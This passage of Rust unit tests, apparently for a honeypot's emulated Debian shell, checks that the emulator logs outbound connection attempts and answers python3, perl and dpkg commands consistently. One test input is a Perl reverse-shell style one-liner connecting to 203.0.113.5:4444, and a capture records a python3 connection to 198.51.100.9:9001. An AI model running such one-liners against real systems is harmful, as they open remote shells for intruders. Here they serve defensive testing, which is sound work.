        assert!(
            result.stderr.contains("ConnectionRefusedError"),
            "{}",
            result.stderr
        );
        assert!(shell.captures.iter().any(|c| matches!(
            c,
            Capture::Download { tool, url, .. }
                if tool == "python3" && url == "tcp://198.51.100.9:9001"
        )));
    }

    #[test]
    fn python3_runs_nothing_and_says_so_consistently() {
        let mut shell = Shell::new("root", "debian");
        // A non-network one-liner exits quietly: inventing output for code that
        // was never run would be a fabrication, not an emulation.
        let quiet = shell.execute("python3 -c 'print(1+1)'");
        assert_eq!(quiet.status, 0);
        assert_eq!(quiet.stdout, "");

        // The version must match what `dpkg -l` reports, or one command
        // contradicts the other.
        let version = shell.execute("python3 --version");
        assert_eq!(version.stdout.trim(), "Python 3.11.2");
        assert!(shell.execute("dpkg -l").stdout.contains("3.11.2"));

        // A script that was never dropped gets the real error, with the
        // absolute path python reports rather than the operand.
        let missing = shell.execute("python3 /tmp/nope.py");
        assert_eq!(missing.status, 2);
        assert!(
            missing.stderr.contains("/tmp/nope.py': [Errno 2]"),
            "{}",
            missing.stderr
        );

        // Debian 12 has no /usr/bin/python, only python3.
        assert_eq!(shell.execute("python -c 'pass'").status, 127);
    }

    #[test]
    fn perl_reports_its_own_failures_not_pythons() {
        let mut shell = Shell::new("root", "debian");
        let result = shell.execute(
            "perl -e 'use Socket;connect(S,sockaddr_in(4444,inet_aton(\"203.0.113.5\")))'",
        );
        assert_eq!(result.status, 255);
        assert!(result.stderr.contains("Connection refused at -e line 1."));
        assert!(shell.captures.iter().any(|c| matches!(
            c,
            Capture::Download { tool, url, .. }
                if tool == "perl" && url == "tcp://203.0.113.5:4444"
        )));
        assert!(shell.execute("perl -v").stdout.contains("v5.36.0"));
    }
}
